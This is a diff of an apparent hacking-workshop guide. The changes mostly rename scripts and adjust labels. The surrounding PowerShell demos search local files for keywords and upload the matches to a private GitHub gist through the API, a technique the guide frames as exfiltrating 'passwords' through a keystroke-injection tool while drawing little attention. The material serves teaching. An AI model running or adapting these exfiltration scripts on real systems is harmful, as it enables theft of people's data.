@@ -79,7 +79,7 @@ https://www.example.com/login-or-something
 Create a new file called "new-github2.ps1" and copy paste the following data in it:
 ```powershell
 
-#Demo 2, let's grab some passwords from local files!
+#Demo 2, let's grab some "passwords" from local files!
 . .\logindata.ps1
 $Content = ls c:\temp -r | Select-String dog,cat,pets | select line,path
 $ContentString = $Content | ForEach-Object { "$($_.path): $($_.line)" } | Out-String
@@ -121,15 +121,15 @@ There is no third demo! Because of the way that Github expects data (json) compa
 # Github  fourth demo
 We want to generate a bit less attention so we will try to have less lines of code on our screen.
 Luckily, we can do this by using “;” in powershell
-Create new-pastebin4.ps1
+Create new-github4.ps1
 
 Remark: This is actually some foreshadowing. This workshop is all about using a virtual keyboard to send malicious commands as fast as possible, using our little hacking tool. So we want to be fast, using less code to make it all more robust.
 
-new-pastebin4.ps1
+new-github4.ps1
 ```powershell
 . .\logindata.ps1
 $c = Get-ChildItem C:\temp -Recurse -File | Select-String 'dog|cat|pets' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
-$body = @{description="Github second demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json -Depth 4
+$body = @{description="Github fourth demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json -Depth 4
 Invoke-WebRequest -Uri "https://api.github.com/gists" -Method POST -Headers @{Authorization="Bearer $FGPAT"; "X-GitHub-Api-Version"="2022-11-28"} -Body $body -ContentType "application/json"
 
 ```
